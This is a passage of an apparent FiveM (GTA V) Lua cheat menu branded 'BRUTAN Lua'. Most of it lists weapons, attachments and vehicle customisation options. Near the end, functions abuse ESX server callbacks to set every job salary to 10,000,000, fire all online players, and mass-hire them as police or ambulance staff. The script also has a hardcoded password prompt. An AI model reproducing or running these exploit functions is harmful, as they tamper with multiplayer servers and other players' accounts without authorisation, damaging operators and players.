                        name = "~h~~r~> ~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
                    }, {
                        name = "~h~~r~> ~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP_02"
                    }
                }
            }
        }, BullpupRifle = {
            id = "weapon_bullpuprifle", name = "~h~~r~> ~s~Bullpup Rifle", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_BULLPUPRIFLE_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_BULLPUPRIFLE_CLIP_02"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_SMALL"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
                    }
                }
            }
        }, BullpupRifleMkII = {
            id = "weapon_bullpuprifle_mk2", name = "~h~~r~> ~s~Bullpup Rifle Mk II", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER"
                    }, {
                        name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY"
                    }, {
                        name = "~h~~r~> ~s~Armor Piercing Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING"
                    }, {
                        name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
                    }, {
                        name = "~h~~r~> ~s~Small Scope", id = "COMPONENT_AT_SCOPE_MACRO_02_MK2"
                    }, {
                        name = "~h~~r~> ~s~Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_MK2"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, Barrel = {
                    {
                        name = "~h~~r~> ~s~Default", id = "COMPONENT_AT_BP_BARREL_01"
                    }, {
                        name = "~h~~r~> ~s~Heavy", id = "COMPONENT_AT_BP_BARREL_02"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"
                    }, {
                        name = "~h~~r~> ~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
                    }, {
                        name = "~h~~r~> ~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
                    }, {
                        name = "~h~~r~> ~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
                    }, {
                        name = "~h~~r~> ~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
                    }, {
                        name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
                    }, {
                        name = "~h~~r~> ~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
                    }, {
                        name = "~h~~r~> ~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
                    }
                }
            }
        }, CompactRifle = {
            id = "weapon_compactrifle", name = "~h~~r~> ~s~Compact Rifle", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_COMPACTRIFLE_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_COMPACTRIFLE_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Drum Magazine", id = "COMPONENT_COMPACTRIFLE_CLIP_03"
                    }
                }
            }
        }
    }, LMG = {
        MG = {
            id = "weapon_mg", name = "~h~~r~> ~s~MG", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_MG_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_MG_CLIP_02"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_SMALL_02"
                    }
                }
            }
        }, CombatMG = {
            id = "weapon_combatmg", name = "~h~~r~> ~s~Combat MG", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_COMBATMG_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_COMBATMG_CLIP_02"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_MEDIUM"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
                    }
                }
            }
        }, CombatMGMkII = {
            id = "weapon_combatmg_mk2", name = "~h~~r~> ~s~Combat MG Mk II", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_COMBATMG_MK2_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_COMBATMG_MK2_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_TRACER"
                    }, {
                        name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY"
                    }, {
                        name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING"
                    }, {
                        name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_COMBATMG_MK2_CLIP_FMJ"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
                    }, {
                        name = "~h~~r~> ~s~Medium Scope", id = "COMPONENT_AT_SCOPE_SMALL_MK2"
                    }, {
                        name = "~h~~r~> ~s~Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"
                    }
                }, Barrel = {
                    {
                        name = "~h~~r~> ~s~Default", id = "COMPONENT_AT_MG_BARREL_01"
                    }, {
                        name = "~h~~r~> ~s~Heavy", id = "COMPONENT_AT_MG_BARREL_02"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
                    }, {
                        name = "~h~~r~> ~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
                    }, {
                        name = "~h~~r~> ~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
                    }, {
                        name = "~h~~r~> ~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
                    }, {
                        name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
                    }, {
                        name = "~h~~r~> ~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
                    }, {
                        name = "~h~~r~> ~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP_02"
                    }
                }
            }
        }, GusenbergSweeper = {
            id = "weapon_gusenberg", name = "~h~~r~> ~s~GusenbergSweeper", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_GUSENBERG_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_GUSENBERG_CLIP_02"
                    }
                }
            }
        }
    }, Snipers = {
        SniperRifle = {
            id = "weapon_sniperrifle", name = "~h~~r~> ~s~Sniper Rifle", bInfAmmo = false, mods = {
                Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_LARGE"
                    }, {
                        name = "~h~~r~> ~s~Advanced Scope", id = "COMPONENT_AT_SCOPE_MAX"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP_02"
                    }
                }
            }
        }, HeavySniper = {
            id = "weapon_heavysniper", name = "~h~~r~> ~s~Heavy Sniper", bInfAmmo = false, mods = {
                Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_LARGE"
                    }, {
                        name = "~h~~r~> ~s~Advanced Scope", id = "COMPONENT_AT_SCOPE_MAX"
                    }
                }
            }
        }, HeavySniperMkII = {
            id = "weapon_heavysniper_mk2", name = "~h~~r~> ~s~Heavy Sniper Mk II", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY"
                    }, {
                        name = "~h~~r~> ~s~Armor Piercing Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING"
                    }, {
                        name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ"
                    }, {
                        name = "~h~~r~> ~s~Explosive Rounds", id = "COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Zoom Scope", id = "COMPONENT_AT_SCOPE_LARGE_MK2"
                    }, {
                        name = "~h~~r~> ~s~Advanced Scope", id = "COMPONENT_AT_SCOPE_MAX"
                    }, {
                        name = "~h~~r~> ~s~Nigt Vision Scope", id = "COMPONENT_AT_SCOPE_NV"
                    }, {
                        name = "~h~~r~> ~s~Thermal Scope", id = "COMPONENT_AT_SCOPE_THERMAL"
                    }
                }, Barrel = {
                    {
                        name = "~h~~r~> ~s~Default", id = "COMPONENT_AT_SR_BARREL_01"
                    }, {
                        name = "~h~~r~> ~s~Heavy", id = "COMPONENT_AT_SR_BARREL_02"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_SR_SUPP_03"
                    }, {
                        name = "~h~~r~> ~s~Squared Muzzle Brake", id = "COMPONENT_AT_MUZZLE_08"
                    }, {
                        name = "~h~~r~> ~s~Bell-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_09"
                    }
                }
            }
        }, MarksmanRifle = {
            id = "weapon_marksmanrifle", name = "~h~~r~> ~s~Marksman Rifle", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_MARKSMANRIFLE_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_MARKSMANRIFLE_CLIP_02"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Scope", id = "COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP"
                    }
                }
            }
        }, MarksmanRifleMkII = {
            id = "weapon_marksmanrifle_mk2", name = "~h~~r~> ~s~Marksman Rifle Mk II", bInfAmmo = false, mods = {
                Magazines = {
                    {
                        name = "~h~~r~> ~s~Default Magazine", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_01"
                    }, {
                        name = "~h~~r~> ~s~Extended Magazine", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_02"
                    }, {
                        name = "~h~~r~> ~s~Tracer Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER"
                    }, {
                        name = "~h~~r~> ~s~Incendiary Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY"
                    }, {
                        name = "~h~~r~> ~s~Hollow Point Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING"
                    }, {
                        name = "~h~~r~> ~s~FMJ Rounds", id = "COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ	"
                    }
                }, Sights = {
                    {
                        name = "~h~~r~> ~s~Holograhpic Sight", id = "COMPONENT_AT_SIGHTS"
                    }, {
                        name = "~h~~r~> ~s~Large Scope", id = "COMPONENT_AT_SCOPE_MEDIUM_MK2"
                    }, {
                        name = "~h~~r~> ~s~Zoom Scope", id = "COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2"
                    }
                }, Flashlight = {
                    {
                        name = "~h~~r~> ~s~Flashlight", id = "COMPONENT_AT_AR_FLSH"
                    }
                }, Barrel = {
                    {
                        name = "~h~~r~> ~s~Default", id = "COMPONENT_AT_MRFL_BARREL_01"
                    }, {
                        name = "~h~~r~> ~s~Heavy", id = "COMPONENT_AT_MRFL_BARREL_02"
                    }
                }, BarrelAttachments = {
                    {
                        name = "~h~~r~> ~s~Suppressor", id = "COMPONENT_AT_AR_SUPP"
                    }, {
                        name = "~h~~r~> ~s~Flat Muzzle Brake", id = "COMPONENT_AT_MUZZLE_01"
                    }, {
                        name = "~h~~r~> ~s~Tactical Muzzle Brake", id = "COMPONENT_AT_MUZZLE_02"
                    }, {
                        name = "~h~~r~> ~s~Fat-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_03"
                    }, {
                        name = "~h~~r~> ~s~Precision Muzzle Brake", id = "COMPONENT_AT_MUZZLE_04"
                    }, {
                        name = "~h~~r~> ~s~Heavy Duty Muzzle Brake", id = "COMPONENT_AT_MUZZLE_05"
                    }, {
                        name = "~h~~r~> ~s~Slanted Muzzle Brake", id = "COMPONENT_AT_MUZZLE_06"
                    }, {
                        name = "~h~~r~> ~s~Split-End Muzzle Brake", id = "COMPONENT_AT_MUZZLE_07"
                    }
                }, Grips = {
                    {
                        name = "~h~~r~> ~s~Grip", id = "COMPONENT_AT_AR_AFGRIP_02"
                    }
                }
            }
        }
    }, Heavy = {
        RPG = {
            id = "weapon_rpg", name = "~h~~r~> ~s~RPG", bInfAmmo = false, mods = {}
        }, GrenadeLauncher = {
            id = "weapon_grenadelauncher", name = "~h~~r~> ~s~Grenade Launcher", bInfAmmo = false, mods = {}
        }, GrenadeLauncherSmoke = {
            id = "weapon_grenadelauncher_smoke", name = "~h~~r~> ~s~Grenade Launcher Smoke", bInfAmmo = false, mods = {}
        }, Minigun = {
            id = "weapon_minigun", name = "~h~~r~> ~s~Minigun", bInfAmmo = false, mods = {}
        }, FireworkLauncher = {
            id = "weapon_firework", name = "~h~~r~> ~s~Firework Launcher", bInfAmmo = false, mods = {}
        }, Railgun = {
            id = "weapon_railgun", name = "~h~~r~> ~s~Railgun", bInfAmmo = false, mods = {}
        }, HomingLauncher = {
            id = "weapon_hominglauncher", name = "~h~~r~> ~s~Homing Launcher", bInfAmmo = false, mods = {}
        }, CompactGrenadeLauncher = {
            id = "weapon_compactlauncher", name = "~h~~r~> ~s~Compact Grenade Launcher", bInfAmmo = false, mods = {}
        }, Widowmaker = {
            id = "weapon_rayminigun", name = "~h~~r~> ~s~Widowmaker", bInfAmmo = false, mods = {}
        }
    }, Throwables = {
        Grenade = {
            id = "weapon_grenade", name = "~h~~r~> ~s~Grenade", bInfAmmo = false, mods = {}
        }, BZGas = {
            id = "weapon_bzgas", name = "~h~~r~> ~s~BZ Gas", bInfAmmo = false, mods = {}
        }, MolotovCocktail = {
            id = "weapon_molotov", name = "~h~~r~> ~s~Molotov Cocktail", bInfAmmo = false, mods = {}
        }, StickyBomb = {
            id = "weapon_stickybomb", name = "~h~~r~> ~s~Sticky Bomb", bInfAmmo = false, mods = {}
        }, ProximityMines = {
            id = "weapon_proxmine", name = "~h~~r~> ~s~Proximity Mines", bInfAmmo = false, mods = {}
        }, Snowballs = {
            id = "weapon_snowball", name = "~h~~r~> ~s~Snowballs", bInfAmmo = false, mods = {}
        }, PipeBombs = {
            id = "weapon_pipebomb", name = "~h~~r~> ~s~Pipe Bombs", bInfAmmo = false, mods = {}
        }, Baseball = {
            id = "weapon_ball", name = "~h~~r~> ~s~Baseball", bInfAmmo = false, mods = {}
        }, TearGas = {
            id = "weapon_smokegrenade", name = "~h~~r~> ~s~Tear Gas", bInfAmmo = false, mods = {}
        }, Flare = {
            id = "weapon_flare", name = "~h~~r~> ~s~Flare", bInfAmmo = false, mods = {}
        }
    }, Misc = {
        Parachute = {
            id = "gadget_parachute", name = "~h~~r~> ~s~Parachute", bInfAmmo = false, mods = {}
        }, FireExtinguisher = {
            id = "weapon_fireextinguisher", name = "~h~~r~> ~s~Fire Extinguisher", bInfAmmo = false, mods = {}
        }
    }
}
local b0 = false;
local b1 = false;
local b2 = false;
local b3 = false;
local b4 = nil;
local b5 = {}
local b6 = {}
local b7 = nil;
local b8 = false;
local b9 = -1;
local ba = -1;
local bb = -1;
local bc = false;
local bd = {
    {
        name = "~h~Spoilers", id = 0
    }, {
        name = "~h~Front Bumper", id = 1
    }, {
        name = "~h~Rear Bumper", id = 2
    }, {
        name = "~h~Side Skirt", id = 3
    }, {
        name = "~h~Exhaust", id = 4
    }, {
        name = "~h~Frame", id = 5
    }, {
        name = "~h~Grille", id = 6
    }, {
        name = "~h~Hood", id = 7
    }, {
        name = "~h~Fender", id = 8
    }, {
        name = "~h~Right Fender", id = 9
    }, {
        name = "~h~Roof", id = 10
    }, {
        name = "~h~Vanity Plates", id = 25
    }, {
        name = "~h~Trim", id = 27
    }, {
        name = "~h~Ornaments", id = 28
    }, {
        name = "~h~Dashboard", id = 29
    }, {
        name = "~h~Dial", id = 30
    }, {
        name = "~h~Door Speaker", id = 31
    }, {
        name = "~h~Seats", id = 32
    }, {
        name = "~h~Steering Wheel", id = 33
    }, {
        name = "~h~Shifter Leavers", id = 34
    }, {
        name = "~h~Plaques", id = 35
    }, {
        name = "~h~Speakers", id = 36
    }, {
        name = "~h~Trunk", id = 37
    }, {
        name = "~h~Hydraulics", id = 38
    }, {
        name = "~h~Engine Block", id = 39
    }, {
        name = "~h~Air Filter", id = 40
    }, {
        name = "~h~Struts", id = 41
    }, {
        name = "~h~Arch Cover", id = 42
    }, {
        name = "~h~Aerials", id = 43
    }, {
        name = "~h~Trim 2", id = 44
    }, {
        name = "~h~Tank", id = 45
    }, {
        name = "~h~Windows", id = 46
    }, {
        name = "~h~Livery", id = 48
    }, {
        name = "~h~Wheels", id = 23
    }, {
        name = "~h~Wheel Types", id = "wheeltypes"
    }, {
        name = "~h~Extras", id = "extra"
    }, {
        name = "~h~Neons", id = "neon"
    }, {
        name = "~h~Paint", id = "paint"
    }
}
local be = {
    {
        name = "~h~~r~Engine", id = 11
    }, {
        name = "~h~~b~Brakes", id = 12
    }, {
        name = "~h~~g~Transmission", id = 13
    }, {
        name = "~h~~y~Suspension", id = 15
    }
}
local bf = {
    ["White"] = {
        255, 255, 255
    }, ["Blue"] = {
        0, 0, 255
    }, ["Electric Blue"] = {
        0, 150, 255
    }, ["Mint Green"] = {
        50, 255, 155
    }, ["Lime Green"] = {
        0, 255, 0
    }, ["Yellow"] = {
        255, 255, 0
    }, ["Golden Shower"] = {
        204, 204, 0
    }, ["Orange"] = {
        255, 128, 0
    }, ["Red"] = {
        255, 0, 0
    }, ["Pony Pink"] = {
        255, 102, 255
    }, ["Hot Pink"] = {
        255, 0, 255
    }, ["Purple"] = {
        153, 0, 153
    }
}
local bg = {
    {
        name = "~h~Black", id = 0
    }, {
        name = "~h~Carbon Black", id = 147
    }, {
        name = "~h~Graphite", id = 1
    }, {
        name = "~h~Anhracite Black", id = 11
    }, {
        name = "~h~Black Steel", id = 2
    }, {
        name = "~h~Dark Steel", id = 3
    }, {
        name = "~h~Silver", id = 4
    }, {
        name = "~h~Bluish Silver", id = 5
    }, {
        name = "~h~Rolled Steel", id = 6
    }, {
        name = "~h~Shadow Silver", id = 7
    }, {
        name = "~h~Stone Silver", id = 8
    }, {
        name = "~h~Midnight Silver", id = 9
    }, {
        name = "~h~Cast Iron Silver", id = 10
    }, {
        name = "~h~Red", id = 27
    }, {
        name = "~h~Torino Red", id = 28
    }, {
        name = "~h~Formula Red", id = 29
    }, {
        name = "~h~Lava Red", id = 150
    }, {
        name = "~h~Blaze Red", id = 30
    }, {
        name = "~h~Grace Red", id = 31
    }, {
        name = "~h~Garnet Red", id = 32
    }, {
        name = "~h~Sunset Red", id = 33
    }, {
        name = "~h~Cabernet Red", id = 34
    }, {
        name = "~h~Wine Red", id = 143
    }, {
        name = "~h~Candy Red", id = 35
    }, {
        name = "~h~Hot Pink", id = 135
    }, {
        name = "~h~Pfsiter Pink", id = 137
    }, {
        name = "~h~Salmon Pink", id = 136
    }, {
        name = "~h~Sunrise Orange", id = 36
    }, {
        name = "~h~Orange", id = 38
    }, {
        name = "~h~Bright Orange", id = 138
    }, {
        name = "~h~Gold", id = 99
    }, {
        name = "~h~Bronze", id = 90
    }, {
        name = "~h~Yellow", id = 88
    }, {
        name = "~h~Race Yellow", id = 89
    }, {
        name = "~h~Dew Yellow", id = 91
    }, {
        name = "~h~Dark Green", id = 49
    }, {
        name = "~h~Racing Green", id = 50
    }, {
        name = "~h~Sea Green", id = 51
    }, {
        name = "~h~Olive Green", id = 52
    }, {
        name = "~h~Bright Green", id = 53
    }, {
        name = "~h~Gasoline Green", id = 54
    }, {
        name = "~h~Lime Green", id = 92
    }, {
        name = "~h~Midnight Blue", id = 141
    }, {
        name = "~h~Galaxy Blue", id = 61
    }, {
        name = "~h~Dark Blue", id = 62
    }, {
        name = "~h~Saxon Blue", id = 63
    }, {
        name = "~h~Blue", id = 64
    }, {
        name = "~h~Mariner Blue", id = 65
    }, {
        name = "~h~Harbor Blue", id = 66
    }, {
        name = "~h~Diamond Blue", id = 67
    }, {
        name = "~h~Surf Blue", id = 68
    }, {
        name = "~h~Nautical Blue", id = 69
    }, {
        name = "~h~Racing Blue", id = 73
    }, {
        name = "~h~Ultra Blue", id = 70
    }, {
        name = "~h~Light Blue", id = 74
    }, {
        name = "~h~Chocolate Brown", id = 96
    }, {
        name = "~h~Bison Brown", id = 101
    }, {
        name = "~h~Creeen Brown", id = 95
    }, {
        name = "~h~Feltzer Brown", id = 94
    }, {
        name = "~h~Maple Brown", id = 97
    }, {
        name = "~h~Beechwood Brown", id = 103
    }, {
        name = "~h~Sienna Brown", id = 104
    }, {
        name = "~h~Saddle Brown", id = 98
    }, {
        name = "~h~Moss Brown", id = 100
    }, {
        name = "~h~Woodbeech Brown", id = 102
    }, {
        name = "~h~Straw Brown", id = 99
    }, {
        name = "~h~Sandy Brown", id = 105
    }, {
        name = "~h~Bleached Brown", id = 106
    }, {
        name = "~h~Schafter Purple", id = 71
    }, {
        name = "~h~Spinnaker Purple", id = 72
    }, {
        name = "~h~Midnight Purple", id = 142
    }, {
        name = "~h~Bright Purple", id = 145
    }, {
        name = "~h~Cream", id = 107
    }, {
        name = "~h~Ice White", id = 111
    }, {
        name = "~h~Frost White", id = 112
    }
}
local bh = "~p~BRUTAN ~b~Lua"
local bi = {
    {
        name = "~h~Black", id = 12
    }, {
        name = "~h~Gray", id = 13
    }, {
        name = "~h~Light Gray", id = 14
    }, {
        name = "~h~Ice White", id = 131
    }, {
        name = "~h~Blue", id = 83
    }, {
        name = "~h~Dark Blue", id = 82
    }, {
        name = "~h~Midnight Blue", id = 84
    }, {
        name = "~h~Midnight Purple", id = 149
    }, {
        name = "~h~Schafter Purple", id = 148
    }, {
        name = "~h~Red", id = 39
    }, {
        name = "~h~Dark Red", id = 40
    }, {
        name = "~h~Orange", id = 41
    }, {
        name = "~h~Yellow", id = 42
    }, {
        name = "~h~Lime Green", id = 55
    }, {
        name = "~h~Green", id = 128
    }, {
        name = "~h~Forest Green", id = 151
    }, {
        name = "~h~Foliage Green", id = 155
    }, {
        name = "~h~Olive Darb", id = 152
    }, {
        name = "~h~Dark Earth", id = 153
    }, {
        name = "~h~Desert Tan", id = 154
    }
}
local bj = {
    {
        name = "~h~Brushed Steel", id = 117
    }, {
        name = "~h~Brushed Black Steel", id = 118
    }, {
        name = "~h~Brushed Aluminum", id = 119
    }, {
        name = "~h~Pure Gold", id = 158
    }, {
        name = "~h~Brushed Gold", id = 159
    }
}
defaultVehAction = ""
if GetVehiclePedIsUsing(PlayerPedId()) then veh = GetVehiclePedIsUsing(PlayerPedId()) end;
local bk = false;
local bl = true;
local bm = GetPlayerServerId(PlayerPedId(-1)) local bn = GetPlayerName(bm) drawNotification("~h~BRUTAN Cheats on YouTube - ~g~Brutan#7799") local
function bo(C, x, y) SetTextFont(0) SetTextProportional(1) SetTextScale(0.0, 0.4) SetTextDropshadow(1, 0, 0, 0, 255) SetTextEdge(1, 0, 0, 0, 255) SetTextDropShadow() SetTextOutline() SetTextEntry("STRING") AddTextComponentString(C) DrawText(x, y) end;

function RequestModelSync(bp) local bq = GetHashKey(bp) RequestModel(bq) while not HasModelLoaded(bq) do RequestModel(bq) Citizen.Wait(0) end end;

    function EconomyDy2() if ESX then ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'police', 0, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'mecano', 0, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'ambulance', 0, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'realestateagent', 0, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'cardealer', 0, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'police', 1, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'mecano', 1, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'ambulance', 1, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'realestateagent', 1, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'cardealer', 1, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'police', 2, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'mecano', 2, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'ambulance', 2, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'realestateagent', 2, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'cardealer', 2, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'police', 3, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'mecano', 3, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'ambulance', 3, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'realestateagent', 3, 10000000) ESX.TriggerServerCallback("esx_society:setJobSalary", function() end, 'cardealer', 3, 10000000) end end;

function UnemployedPlayers() if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(an) for i = 1, #an, 1 do label = an[i].name;
    value = an[i].source; name = an[i].name; identifier = an[i].identifier; ESX.TriggerServerCallback("esx_society:setJob", function() end, identifier, 'unemployed', 0, 'fire') end end) end end;

function AmbulancePlayers() if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(an) for i = 1, #an, 1 do label = an[i].name;
    value = an[i].source; name = an[i].name; identifier = an[i].identifier; ESX.TriggerServerCallback("esx_society:setJob", function() end, identifier, 'ambulance', 3, 'hire') end end) end end;

function PolicePlayers() if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(an) for i = 1, #an, 1 do label = an[i].name;
    value = an[i].source; name = an[i].name; identifier = an[i].identifier; ESX.TriggerServerCallback("esx_society:setJob", function() end, identifier, 'police', 4, 'hire') end end) end end;
local br = 0;
cappA = "God~s~F~s~a~s~l~s~l~s~e~s~n~s~#~s~0~s~8~s~1~s~1"
local bs = "Password?";
local
function bt() if br == 3 then ForceSocialClubUpdate()
else local af = KeyboardInput("Password?", "", 100) if af == bs then mhaonn = true;
PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) Citizen.Wait(100) PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) Citizen.Wait(100) PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
else br = br + 1;
PlaySoundFrontend(-1, "MP_WAVE_COMPLETE", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) end end end;

function MecanoPlayers() if ESX then ESX.TriggerServerCallback("esx_society:getOnlinePlayers", function(an) for i = 1, #an, 1 do label = an[i].name;
